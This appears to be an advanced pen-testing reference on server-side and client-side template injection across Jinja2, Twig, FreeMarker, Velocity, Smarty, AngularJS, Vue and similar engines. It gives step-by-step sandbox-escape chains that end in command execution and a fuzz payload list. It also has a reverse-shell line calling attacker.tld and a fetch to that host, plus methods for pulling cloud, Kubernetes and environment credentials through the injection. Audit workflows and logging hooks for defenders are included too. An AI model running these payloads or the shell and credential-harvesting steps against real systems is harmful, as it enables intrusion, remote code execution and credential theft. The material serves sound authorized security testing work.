**Operational shape for pen-testers**:
- Running TEFuzz on a target requires setting up multiple template engines with the target's specific version.
- The output is candidate bugs; each requires triage to determine whether it is a real class-shape or a benign differential.
- Not typically run in engagement time; useful for research and background audit.

**Alternatives**:
- **Grammar-aware fuzzers like Boofuzz or AFL++** with a template-specific grammar file can find parser-level bugs.
- **Custom fuzzing harnesses** for the specific engine — the Python `atheris` or `hypothesis` for Python engines; the Java `jazzer` for JVM engines.

## Blind SSTI — Extended Probes

Beyond the base ladder and the primary blind methodology above, additional advanced probes:

**Cross-request cache-write side-channel**. A template that writes to a cache key that a subsequent request can read (via an unauthenticated cache-lookup endpoint). Chain: SSTI on write endpoint → cache write → cache lookup on read endpoint. Time to observation is short (immediate).

**Log-line injection with reflection**. A template that produces a log line containing evaluated data; if the log is readable by the attacker (via a debug endpoint, a shared log aggregator, an error-page dump), the evaluated content is the covert channel.

**Email-delivery side-channel**. A template that reaches the email-sending path with attacker-controlled subject/body. The email is delivered to an attacker-controlled address (if the app allows arbitrary email recipients) with the evaluated content in the body.

**Response-header side-channel with `Set-Cookie`**. A template that sets a `Set-Cookie` header with the evaluation as the cookie value. The cookie is observable in the response headers.

**Redirect-URL side-channel**. A template that reaches `Location:` header construction; the evaluated content is embedded in the URL. Observable via the response.

**Rate-limiter side-channel**. A template that reaches the rate-limiter's counter increment; the attacker observes the rate-limiter's state via a subsequent request that triggers the rate limit at a specific threshold.

**Metric-emission side-channel**. A template that emits a metric (via StatsD, Prometheus, etc.) with the evaluated content as a label. Observable via the metrics endpoint if reachable.

**File-system stat side-channel**. A template that stats a file whose path includes the evaluated content; the attacker observes via subsequent HTTP requests whether the file exists.

**Cross-instance timing correlation**. A template that induces load on a shared resource (DB connection pool, thread pool); observable via response-time shifts on adjacent instances.

## Expression-Context Differential Examples

Concrete cases where the same expression evaluates differently based on context:

**Django `format_html` vs `mark_safe`**. `format_html("{}", user)` HTML-escapes `user`; `mark_safe(user)` does not. A template chain that goes through both may reach unescaped output.

**Jinja `{% autoescape false %}` block**. Inside such a block, expressions produce unescaped output. A `{% include %}` from inside the block inherits the autoescape state; a template that assumes autoescape may render unsafe output.

**Twig `{% verbatim %}` vs `{% autoescape %}`**. `{% verbatim %}` disables Twig parsing (renders template syntax literally); `{% autoescape %}` toggles autoescape.

**Thymeleaf HTML-mode vs TEXT-mode escaping**. HTML mode escapes `< > " ' &`; TEXT mode escapes nothing. Email templates in TEXT mode with user input are direct injection.

**FreeMarker `<@compress single_line=true>` blocks**. Compress blocks normalize whitespace; a payload that depends on specific whitespace may render differently inside vs outside.

**Handlebars triple-brace `{{{...}}}` vs double-brace `{{...}}`**. Triple-brace disables HTML-escape; double-brace enables it. The same variable rendered both ways in different template contexts produces different escape behavior.

**EJS `<%= %>` vs `<%- %>`**. `<%= %>` escapes HTML; `<%- %>` does not.

**Mustache `{{{ }}}` vs `{{ }}`**. Same as Handlebars.

Any of these context differences is a class-detection surface. When the target uses a mix (some templates HTML-escape, some do not), the attacker's payload has to match the specific template's escape mode.

## Sandbox-Escape Chain Sketches

Concrete step-by-step chains from a sandboxed context to RCE per engine.

**Jinja2 SandboxedEnvironment → RCE via CVE-2025-27516 (pre-3.1.6)**:
1. Confirm `SandboxedEnvironment`: `{{ ''.__class__ }}` raises SecurityError.
2. Apply the `|attr` filter with `'format'`: `{{ ''|attr('format') }}` returns `<method 'format' of 'str' objects>`.
3. Reach `__class__` via format: `{{ ''|attr('format').__globals__['__class__'] }}` — the format method's globals include reachable classes.
4. Walk to `subclasses`: same class walk as unsandboxed Jinja, but reached through the format-callable path.
5. Locate exec: `subprocess.Popen` or `os._wrap_close` in the subclass list.
6. Fire: `Popen(['id'], stdout=-1).communicate()[0].decode()`.

**Twig Sandbox → RCE via CVE-2024-45411 (pre-1.44.8/2.16.1/3.11.1/3.14.0, all three conditions met)**:
1. Confirm sandbox is enabled but the three conditions are met (globally-disabled + include-by-name + previously-loaded-unsandboxed).
2. Craft an include of the previously-loaded template: `{% sandbox %}{% include 'previously_loaded_template' %}{% endsandbox %}`.
3. Inside the previously-loaded template, use the `_self.env.registerUndefinedFilterCallback` gadget: `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`.
4. The sandbox check skips because of the three-condition bypass; the callback fires.

**Freemarker `SAFER_RESOLVER` → RCE via allowlisted class**:
1. Confirm `SAFER_RESOLVER` is set.
2. Enumerate app-registered shared variables via `<#list .globals?keys as k>${k}: ${.globals[k]?string!'null'}</#list>`.
3. Identify an app-registered class not in the SAFER blocklist that reaches Runtime or ProcessBuilder.
4. Instantiate: `<#assign x = "com.company.SharedRuntime"?new()>${x.execute("id")}`.

**Velocity SecureUberspector → escape via Velocity Tools $class**:
1. Confirm SecureUberspector.
2. Test `$class` availability: `$class` — if it renders as a ClassTool, tools are loaded.
3. Reach reflection: `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")`. The ClassTool wraps reflection in a way that may bypass SecureUberspector depending on version.

**Smarty SmartySecurity → RCE via `{fetch}` SSRF chain**:
1. Confirm SmartySecurity is on but `$trusted_uri` is set.
2. Set up an attacker-controlled URL that redirects to an internal-only URL.
3. Craft `{fetch}` payload: `{fetch file="http://attacker.tld/redirect"}` — the fetch follows the redirect; internal content reaches the template output.
4. Chain into internal API access → app-level compromise via the internal API.

## Deep Detection Methodology

**Multi-endpoint template-engine mapping**. Given a target with many endpoints, systematically probe each. Different endpoints often use different engines — the public site uses Handlebars/Mustache; the admin panel uses Jinja; the email preview uses Twig. Each engine is a distinct finding with distinct payloads.

**Sandbox-mode confirmation vs assumption**. Never assume the sandbox is on based on the framework's default. Confirm by probing. A Flask app that instantiates `Environment()` explicitly (instead of accepting Flask's default `SandboxedEnvironment` in specific configurations) has the full Python reflection surface. The audit is per-instance, not per-framework.

**Cross-request state manipulation**. Some templates persist state across requests (via globals, or via `set` statements that reach shared context). A probe that modifies state in one request and observes in a subsequent request reveals whether cross-request state is exploitable.

**Framework-context injection**. A Jinja2 template running in Flask has access to `{{ config }}`, `{{ request }}`, `{{ g }}`. A template running in Django has different globals. A template running with no framework has only Python builtins and whatever the app explicitly registered. Enumerate the framework context via `{% for k, v in globals().items() %}{{ k }}={{ v }}{% endfor %}` or the engine-specific equivalent.

**Sandbox-mode fingerprint via error differential**. Send a probe that requires reflection (`{{ ''.__class__ }}`); note the specific error. Different Jinja versions raise `SecurityError` with different messages, and framework wrappers (Flask, Django) may wrap the exception differently. The message is a fingerprint.

**Template loader mode**. Jinja / Twig can load templates from disk (`FileSystemLoader`), from a package (`PackageLoader`), from a dict (`DictLoader`), or from a string (`StringLoader` via `template_from_string`). Each has different security implications. Confirm which loader is in use.

## CSTI — Deeper History and Modern Framework Surfaces

**AngularJS 1.x expression sandbox history**. The AngularJS team shipped an expression sandbox in 1.2 that blocked `constructor` walks and `Function` construction. Multiple public bypasses landed 2013–2016 (via reflection through DOM elements, via `angular.copy` behaviors, via prototype-inspection paths). The team's 1.6 release removed the sandbox entirely with an explicit statement that the sandbox was "not a security boundary." This means any AngularJS 1.6+ application that renders user input inside a `{{}}` interpolation is direct script execution. The historical bypasses on 1.2–1.5 are also worth knowing because legacy AngularJS deployments persist:
- Constructor-walk: `{{constructor.constructor('alert(1)')()}}`.
- `$eval` route: `{{$eval.constructor('alert(1)')()}}`.
- `toString`-abuse: various object types with `toString` that reaches code.

**Angular (2+) SSTI-shape vs XSS-shape**. Modern Angular (not AngularJS) uses a compiled template model; user input inside `{{...}}` is treated as a value, not compiled as a template. However, `bypassSecurityTrustHtml` / `bypassSecurityTrustScript` / `bypassSecurityTrustUrl` / `bypassSecurityTrustResourceUrl` on `DomSanitizer` opt out of Angular's sanitization for a specific value; user input passed through these APIs reaches the rendered output unsanitized. This is XSS-shape, not CSTI-shape — route to `xss.md § Angular`.

Modern Angular does have a documented CVE class (CVE-2026-88057): compile-time-vs-runtime sanitization differential where directives whose host bindings land on different elements at runtime bypass sanitization. This is XSS-shape; route to `xss_novel_deep.md § Angular CVE-2026-88057`.

**Vue 3 in-DOM template compilation**. When Vue is mounted with the full build (`vue.global.js` rather than `vue.runtime.js`) on an existing element, the element's content is compiled as a template. User content in the mounted DOM is evaluated. Runtime-only builds parse templates at build time and are not affected. Payload:
```
{{_c.constructor('alert(1)')()}}
```

The mitigation is to use runtime-only builds or to mount on a template string rather than an existing DOM element.

**Vue 3 `v-html` directive**. Renders HTML directly without sanitization. This is XSS-shape; route to `xss.md § Vue`.

**Vue 3 `$eval` filter**. Some Vue configurations expose `$eval` for expression evaluation; user-controlled `$eval` args reach code execution.

**htmx expression contexts**. htmx (`bigskysoftware/htmx`) uses HTML attributes to declare AJAX behavior:
- `hx-vals='javascript:{ ... }'` — the `javascript:` prefix evaluates the following as JavaScript to produce request values. Attacker-controlled attribute value is direct execution.
- `hx-headers='javascript:{ ... }'` — same shape for headers.
- `hx-on:<event>="js"` — inline event handlers.
- `hx-target=""` and `hx-swap=""` — attacker-controlled swap targets can misdirect the DOM update.

htmx is a growing pattern in server-rendered apps; the attack surface is HTML-attribute-driven, so attacker markup with these attributes runs on the client. Route to `xss.md § htmx`.

**AlpineJS `x-*` directives**. Alpine's directive syntax evaluates JavaScript in the component scope:
- `x-html="user"` — raw HTML sink.
- `x-init="js"` — evaluated on component init.
- `x-on:<event>="js"` — event handler.
- `x-bind:<attr>="js"` — dynamic attribute value.
- `x-model="js"` — data-binding expression.
- `x-data="js"` — component initial state (evaluated as JS).
- `x-show="js"`, `x-if="js"`, `x-for="js in items"`, `x-text="js"`.

Alpine v3 introduced CSP-safe mode that restricts the evaluation surface. Route to `xss_advanced_deep.md § Script Gadget Classes`.

**LitElement / lit HTML templates**. Lit's `html\`<div>${user}</div>\`` template tag treats interpolated values as data by default — HTML-safe. The `unsafeHTML` directive explicitly opts out: `html\`${unsafeHTML(user)}\`` is XSS-shape.

**Qwik / Solid / Svelte**. Each has its own directive syntax and sink API; the CSTI-shape depends on whether the framework compiles templates at build time (safer) or at runtime (attack surface). Route to `xss.md` for framework-specific handling.

**CSTI vs SSTI decision**: the class-detection payload (`{{7*7}}` shaped) is SSTI-detection; whether the impact is server-side RCE or browser-side XSS depends on where the evaluation lands. On classical SSRE (Angular, Vue in-DOM, Handlebars in browser), the evaluation is browser-side and impact is XSS. On SSTI, evaluation is server-side and impact is RCE. In pen-testing reports, distinguish clearly — the finding severity, mitigation, and remediation path differ.

## Detection Payload Matrix — Advanced Depth

Beyond the base's engine-identifying probes, the advanced probes fingerprint framework wrappers, sandbox modes, and specific library-version bypasses.

**Framework-wrapper fingerprint** — for a target with `{{7*7}}=49` confirmed, distinguish which framework runs:

| Probe | Framework/library | Rendering behavior |
|-------|-------------------|---------------------|
| `{{ config }}` renders `<Config {...}>` | Flask + Jinja2 | Flask-specific `config` global |
| `{{ request }}` renders `<Request '...' [...]>` | Flask + Jinja2 | Flask-specific `request` global |
| `{{ csrf_token }}` renders a hex string | Django | Django CSRF-token access |
| `{{ user }}` renders a user object | Django | Django auth context |
| `{{ dump(user) }}` renders full var dump | Twig + debug | Twig debug extension loaded |
| `{{ constant('PHP_VERSION') }}` renders PHP version | Twig | Twig `constant` function |
| `${servletContext}` renders a ServletContext | JSP EL | Java-EE deployment |
| `${appName}` renders app name | SpEL + Spring | Spring Application context |
| `#[global.name]` renders MVEL result | MVEL (Mule) | Mule ESB integration |

**Sandbox-mode fingerprint** — for Jinja2 specifically:

| Probe | Result on Environment | Result on SandboxedEnvironment |
|-------|------------------------|--------------------------------|
| `{{ ''.__class__ }}` | `<class 'str'>` | SecurityError |
| `{{ ''\|attr('__class__') }}` (pre-3.1.6) | `<class 'str'>` | `<class 'str'>` — bypass shape! |
| `{{ ''\|attr('__class__') }}` (post-3.1.6) | `<class 'str'>` | SecurityError |
| `{{ config.__class__ }}` (Flask) | `<class 'flask.config.Config'>` | SecurityError |
| `{{ ''.upper() }}` | `''` | `''` — normal method access unaffected |
| `{{ ''.format('x') }}` | error (format needs braces) | SecurityError (format is blocked) |

**Library-version fingerprint via reflection** — a probe that reveals the exact library version through indirect observation:
- Jinja2: some releases have distinct error message wording; capture the error on a syntax-error probe.
- Twig: `{{ _twig_version }}` in some versions.
- FreeMarker: `${.now?string?date}` renders with version-specific formatting.
- Handlebars: `{{ .. }}` produces version-specific errors.

**Content-type-and-context fingerprint** — the same template engine may behave differently in different content contexts. Test with `Accept: text/html`, `Accept: application/json`, and `Accept: text/plain` and observe whether the sink fires the same in each. Some engines auto-escape based on content-type detection.

## Chain-Primitive Composition — Advanced Cases (Extended)

Beyond the earlier list:

**SSTI + credentials-in-config-file → cloud-account compromise**. The template reads the app's cloud-config file (`.aws/credentials`, `serviceaccount.json`); credentials are exfiltrated in the response body. Route to `cloud/*.md` for the per-provider credential usage.

**SSTI + subprocess spawning → arbitrary command with app-server privileges**. Not just `id` — real destructive-tier RCE.

**SSTI + reverse-shell establishment**. `nc -e /bin/sh attacker.tld 4444` via subprocess. Immediate interactive shell.

**SSTI + LDAP-directory bind → domain-controller access**. Templates that reach LDAP-client construction and bind can enumerate the directory and, in some configurations, modify entries.

**SSTI + Kerberos ticket extraction**. Templates that reach `klist` / Kerberos-API access on the server can extract cached tickets.

**SSTI + Docker socket access**. If `/var/run/docker.sock` is reachable from the render process, templates can launch privileged containers and escape the host.

**SSTI + Kubernetes service-account token access**. Templates that read `/var/run/secrets/kubernetes.io/serviceaccount/token` can authenticate to the K8s API with the pod's RBAC.

**SSTI + inter-container network access**. In multi-container pods, the render container may have network access to sibling containers not exposed to the outside world. SSTI + curl to sibling container = internal-service access.

**SSTI + reading of `/proc/self/environ`**. Environment variables often contain secrets (database passwords, API tokens, cloud role ARNs). A template that reads and reflects `/proc/self/environ` is credential harvest.

**SSTI + git-config disclosure**. If the render process has access to the git repository (self-hosted CI/CD), reading `.git/config` reveals repo credentials.

**SSTI + npm/pip package installation on the render host**. Some render environments allow `pip install` / `npm install`; a template that reaches this path can install attacker packages with post-install scripts.

**SSTI + `import` of arbitrary modules**. Templates that reach `import` (Python) or `require` (Node) can load any module on classpath / module search path; combined with a known-vulnerable module on the target, this expands the attack surface.

## Sandbox Mode Audit Templates

Concrete audit workflows per engine:

**Jinja2 audit workflow**:
1. Grep the app for `Environment(` and `SandboxedEnvironment(` — which is instantiated?
2. Grep for `.select_autoescape(` — autoescape configuration.
3. Grep for `render_template_string(` — direct SSTI sink.
4. Fire the sandbox-mode-fingerprint probe (`{{ ''.__class__ }}`) and confirm the mode.
5. If sandbox: attempt `{{ ''|attr('format') }}` — if returned, CVE-2025-27516 candidate on pre-3.1.6.
6. If unsandboxed: full RCE chain.

**Twig audit workflow**:
1. Grep for `new Twig\Environment(` and `new Twig\Sandbox\SecurityPolicy(`.
2. Grep for `template_from_string(` and `render(user_input)`.
3. Fire `{{ _self }}` — string (2.x/3.x) vs object (1.x).
4. If sandbox extension configured: attempt `{{ _self.env.registerUndefinedFilterCallback('system') }}` — SecurityError.
5. If no sandbox: fire the classical `_self.env` gadget.

**FreeMarker audit workflow**:
1. Grep for `Configuration.setNewBuiltinClassResolver(` — resolver mode.
2. Grep for `Configuration.setSharedVariables(` — registered globals.
3. Fire `<#assign x = "freemarker.template.utility.Execute"?new()>${x("id")}` — succeeds on UNRESTRICTED_RESOLVER.
4. If fails, try `SAFER_RESOLVER`-bypass classes.

**Velocity audit workflow**:
1. Grep for `runtime.introspector.uberspect` config.
2. Grep for Velocity-Tools registration.
3. Fire reflection probe: `$class.inspect("java.lang.Runtime")` — succeeds on default UberspectImpl or with Velocity Tools.

**Smarty audit workflow**:
1. Grep for `enableSecurity(` — SmartySecurity configured?
2. Grep for `Smarty::SMARTY_TRUSTED_URI` and `trusted_dir`.
3. Fire `{fetch file="http://attacker.tld"}` — succeeds if security allows fetches.

## Cross-Cutting Instrumentation for Detection

Instrumenting the target template engine to reveal SSTI is a defensive practice worth explaining for both audit and exploitation purposes.

**Jinja2 instrumentation** — subclass `SandboxedEnvironment` and log every `getattr` and `getitem` call:
```python
class LoggingSandbox(SandboxedEnvironment):
    def getattr(self, obj, attribute):
        logger.info(f"getattr({obj!r}, {attribute!r})")
        return super().getattr(obj, attribute)
```
Any unusual attribute access reveals exploitation attempts.

**Twig instrumentation** — extend `Twig\Environment` and hook `compile`:
```php
class LoggingEnvironment extends Environment {
    public function compile($source) {
        error_log("compile: " . $source);
        return parent::compile($source);
    }
}
```

**Runtime hook for FreeMarker** — subclass `TemplateClassResolver` and log every resolution.

**Runtime hook for Velocity** — implement a logging `Uberspector` and register it via `runtime.introspector.uberspect`.

**Cross-engine detection via WAF signature**:
- ModSecurity rules for common SSTI probes (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`).
- The rules typically block detected probes but can be bypassed via encoding, whitespace, and case variations.

## Advanced Testing Methodology (Extended)

Beyond the base 7-step methodology, additional advanced steps:

1. **Reproducibility artifact requirements**: every finding attaches (a) the exact template-injection payload, (b) the exact request/response wire trace, (c) the callback log (OAST) or side-channel measurement, (d) the fingerprint evidence (engine, version, sandbox mode), (e) the fixed-version rebuttal result.

2. **Multi-instance validation**: test the same payload against multiple instances of the target (prod, staging, canary). Consistent behavior across instances confirms the finding is not a coincidence of one instance's state.

3. **Cross-time-window validation**: test the same payload at different times of day; some findings depend on state that changes (a cache that expires overnight, a session that rotates). Consistent behavior across time confirms.

4. **Version-aware exploitation**: for a target on a known version, load the matching CVE's PoC from `ssti_novel_deep.md` and iterate. Do not blindly spray generic gadgets when a version-specific bypass is documented.

5. **Adjacent-endpoint enumeration**: after finding SSTI on one endpoint, sweep every other endpoint the app exposes. Different endpoints may use different template engines or different sandbox modes.

6. **Framework-context enumeration**: after fingerprinting the framework, enumerate the framework-specific globals. Flask exposes `{{ config }}`, `{{ request }}`, `{{ g }}`; Django exposes `{{ user }}`, `{{ csrf_token }}`, `{{ request }}`. Each global is a gadget candidate.

7. **Payload minimization**: once RCE is confirmed, iterate the payload down to the minimum that still fires. A payload with 30 characters is more useful for report writing and for stealth than one with 300.

8. **Report the class shape, not just the CVE**: the report's follow-through value is proportional to how much the client learns about the class abstraction. A finding of "Jinja2 `SandboxedEnvironment` with `|attr` filter reachable on version < 3.1.6 (CVE-2025-27516)" is one finding; a finding of "sandbox-escape via filter-callable-lookup class, exemplified by CVE-2025-27516 and generalizing to any filter path that returns unwrapped callables" is more valuable for the client's long-term audit posture.

## Blind SSTI — Response-Body Content-Length Differential

A sophisticated variant of the size-based side channel:

**Setup**: fire a template that produces variable-length output based on the evaluation. `{{ evaluation-result * n }}` where `n` varies.

**Observation**: capture `Content-Length` header (or the response body size directly) for each variant.

**Interpretation**: consistent variation in size vs the variant parameter confirms that the evaluation ran and produced varying output; a flat Content-Length across variants suggests the sink is not live.

**Advantage**: works even when the response body is otherwise unreadable (encrypted, encoded, transformed downstream).

**Requires**: the template output reaches the response body length at all (not just an internal log or a side effect that doesn't affect response size).

## SSTI Sink Discovery via Fuzzing

**Fuzz payload set** — a starter list for automated SSTI probing:
```
{{7*7}}
{{7*'7'}}
${7*7}
<%= 7*7 %>
<%- 7*7 -%>
#{7*7}
{{= 7*7 }}
[[${7*7}]]
${{ 7*7 }}
{% raw %}{{ 7*7 }}{% endraw %}
{{ '{{7*7}}' }}
%7B%7B7%2A7%7D%7D
&#x7B;&#x7B;7*7&#x7D;&#x7D;
```

For each payload, submit and check whether the response contains `49` (or `7777777` for Jinja string repetition). Automated tools iterate this matrix across every parameter.

**Response-differential fuzzing**: for a target where the response is highly variable (a search endpoint that returns different results per query), the naive "contains 49" check has false positives. The differential approach: fire the same payload twice (with only the evaluation-yielding portion differing) and check whether the difference in output matches the expected evaluation difference.

**Sample: `{{7*7}}` vs `{{7*8}}`** — the former should produce `49`, the latter `56`. If both appear in responses correlating with each payload, SSTI is confirmed.

**Sample: `{{'a' ~ 7*7}}` vs `{{'a' ~ 7*8}}`** — should produce `a49` vs `a56`. The `a` prefix eliminates coincidence.

## Sandbox Escape Class Generalization

The Jinja `|attr` → `str.format` bypass class generalizes across every sandbox-mode template engine. The pattern:

1. **Sandbox blocks direct access to a dangerous callable X.**
2. **Sandbox exposes filter/method Y that internally returns a reference to X.**
3. **The filter/method Y does not wrap the returned callable through the sandbox's callable-check.**
4. **Result: attacker acquires unwrapped callable X, invokes it, bypasses the sandbox.**

Predicted follow-ons in other engines:
- **Twig filters that return callables**: any filter whose output is a callable and whose invocation is not gated by SecurityPolicy. Audit each filter's return type and post-invocation handling.
- **FreeMarker builtins that return objects with unsafe methods**: `?keys` returns a sequence; if any element in the sequence has methods that reach reflection, the sequence-walk bypasses the resolver.
- **Velocity introspector return-value handling**: `SecureUberspector` restricts what introspection produces, but if a `#set` assigns the result of a restricted introspection to a variable, subsequent uses of the variable may not be re-checked.
- **Handlebars helper return values**: if a helper returns an object, subsequent access to that object's properties may bypass Handlebars' own restrictions.

The generalization is: any sandbox that checks at method-invocation but not at return-value has this class shape. Auditing every filter/method for return-value handling is the systematic detection approach.

## Engine-Version Boundary Awareness

For each engine, the specific version boundaries matter for exploitation:

- **Jinja2**: sandbox behavior changed across 2.x → 3.x; `|attr` filter fix in 3.1.6 (CVE-2025-27516). Pre-3.1.6 sandboxed instances vulnerable to the `|attr` bypass.
- **Twig**: 1.x → 2.x sandbox refactor removed `_self.env` access; 3.11.1/3.14.0 fix for CVE-2024-45411.
- **FreeMarker**: `?api` builtin restricted from 2.3.30; `TemplateClassResolver` API introduced earlier.
- **Velocity**: `SecureUberspector` recommended since 1.5; 2.x has additional restrictions.
- **Handlebars**: March 2026 wave fixes across multiple GHSAs.
- **Smarty**: 3.x → 4.x transition removed `{php}`; 4.x → 5.x adds new restrictions.
- **Django**: template-engine CVEs are rare 2024–2026; DTL is stable.

Fingerprint the version and match against the CVE tables in `ssti_novel_deep.md` before selecting a payload.

## Multi-Engine Deployment Cases

Real-world deployments frequently use multiple template engines simultaneously. The audit implications:

**Public site + admin backend on different engines**. Many enterprise apps use one engine for public-facing pages (fast, sandboxed) and another for admin/reporting (feature-rich, less sandboxed). The admin engine is often the higher-severity finding because it has fewer safeguards and typically has broader data access.

**SSR framework + client-side template compilation**. Next.js with Handlebars-based email templates, or Django with client-side Vue components. The SSR path and the client path each have their own SSTI/CSTI surface; fingerprint both.

**Email templates in a different language from the app**. An app written in Node with Handlebars email templates but a Python microservice for email delivery using Jinja2 — the email-sending path may hit either engine depending on the specific email type. Testing requires triggering the specific email type per engine.

**Legacy JSP mixed with modern JavaScript templates**. Java-EE deployments in the middle of a front-end migration may have both JSP EL (older pages) and React (newer pages). The JSP EL path is the classical Java SSTI surface; the React path is XSS-shape.

**Config templates in Jinja, code templates in a different engine**. Ansible uses Jinja2 for playbook templating and may use other engines for included files or scripts. Templating in configuration is often less audited than templating in application code.

**Attack methodology for multi-engine deployments**:
1. Enumerate every template-rendering path in the app.
2. Fingerprint the engine at each.
3. Test the SSTI-detection payload matrix per engine.
4. Report findings per engine — do not consolidate into a single finding just because multiple engines are involved.

## Advanced Report Structure

For the advanced-tier SSTI finding, the report includes:

- **Payload minimality proof** — the minimum payload that fires, plus the discovery process (what was tried first, what worked). Establishes that the finding is not a fragile artifact of a specific payload variant.
- **Version-and-mode fingerprint** — exact engine, exact version, sandbox mode, framework wrapper. All four independently verified.
- **Class-shape framing** — is the finding a known CVE, a novel bug, or a general class expression? Frame accordingly.
- **Escape-surface analysis** — for sandboxed engines, name the specific escape surface (filter-callable-lookup, template-source-injection, expression-context-differential).
- **Reachability proof** — how does attacker input reach the sink? Full data-flow trace from the entry endpoint to the render call.
- **Impact demonstration** — the RCE payload (bounded), the callback proof, and the compound-chain expansion (SSTI → RCE → cloud-cred).
- **Rebuttal proof** — same payload against a patched adjacent instance; confirmation that the finding is not infrastructure noise.
- **Follow-through recommendation** — the sandbox-mode audit process, dependency-version pinning, framework-migration recommendation.

## Cross-Cutting Frontier Trends

Three trends define where SSTI is heading in 2024–2026, worth noting at advanced depth for engagement planning:

- **LLM tooling as SSTI vector**. The Environment-vs-SandboxedEnvironment regression in banks / Haystack / spacy-llm shows that new library ecosystems tend to default to unsafe modes. As LLM-adjacent libraries proliferate (LangChain, LlamaIndex, semantic-kernel, autogen), each new one is a candidate for the same class shape. Pen-testing engagements against LLM-hosting infrastructure should include an SSTI-in-prompt-template check as a first-tier probe.
- **CI/CD as SSTI vector**. GitHub Actions expression injection, Argo Workflows template-reference bypass, Jenkins Groovy pipeline injection — all instances of "trusted evaluator with attacker input" in build/deploy tooling. As CI/CD systems become more expressive (per-step conditional logic, per-step secret injection), the surface expands. Engagements against CI/CD pipelines should include the expression-injection class as a systematic check.
- **Reachability-vs-signature detection**. Traditional SSTI detection is signature-based (match probes against known engines). The frontier is reachability-based: static analysis that identifies whether user input can reach a template-source-injection sink, regardless of engine. Tools that combine this reachability analysis with per-engine sandbox-mode understanding are the next-generation detection approach.

Each of these three frontier trends is a Batch-4-plus audit priority; expect specific vendor tools to appear for each within the next release cycle.

## Testing Recipe Consolidation

Cross-referencing the base's per-engine recipes with the advanced-tier sandbox-audit workflows, the consolidated workflow for a target with unknown template engine:

1. **Initial fingerprint** — fire the base's engine-identifying matrix (`{{7*7}}` / `${7*7}` / `<%=7*7%>` / `#{7*7}`) across every discovered endpoint.
2. **Framework wrapper fingerprint** — for each identified engine, fire the framework-wrapper probes to narrow the framework (Flask + Jinja vs Django + Jinja vs raw Jinja).
3. **Sandbox mode fingerprint** — for each (engine, framework) pair, fire the sandbox-mode probes to determine whether the sandbox is on.
4. **Version fingerprint** — capture version-specific error messages or use reflection when available.
5. **CVE-match lookup** — cross-reference the (engine, version) tuple against `ssti_novel_deep.md`'s CVE tables.
6. **Payload selection** — pick the smallest payload that matches the target's CVE window; fall back to sandbox-escape generics if no CVE matches.
7. **Ladder progression** — confirm → reflection → file-read → timing → OAST → exec, per the base's confirmation-without-RCE ladder.
8. **Chain composition** — extend the SSTI primitive into the downstream chain (cloud creds, lateral SSRF, persistence).
9. **Rebuttal** — same payload against patched/adjacent instance.
10. **Report** — per the advanced report structure above.

The consolidated workflow is the operational default. Deviations (running TEFuzz for novel-class discovery, running instrumentation-based detection) are for research scenarios rather than typical engagements.

## Summary

Advanced SSTI exploitation depends on the sandbox-mode audit: know exactly which mode the engine is running in, what the mode blocks, and what escape surface the mode leaves. The Jinja2 `SandboxedEnvironment` source dissection is the exemplar (block leading-underscore attrs and unsafe callables; leave the filter-and-lookup path as the escape surface); the pattern generalizes to Twig's SecurityPolicy, FreeMarker's TemplateClassResolver, Velocity's Uberspector, Smarty's SmartySecurity. The per-engine gadget catalog is small once the engine is known; the audit's cost is in fingerprinting and reachability, not in gadget selection. CSTI overlaps in mechanism but routes to `xss.md` for impact; TEFuzz-style differential fuzzing is the current frontier detection approach. The base file owns the primitive tour and framework-layer surface; the novel sibling owns the 2024–2026 canonical CVE version tables; this file owns the sandbox-differential dissection, the per-engine escape catalog, blind-methodology depth, CSTI crossover, and the detection frontier framing.
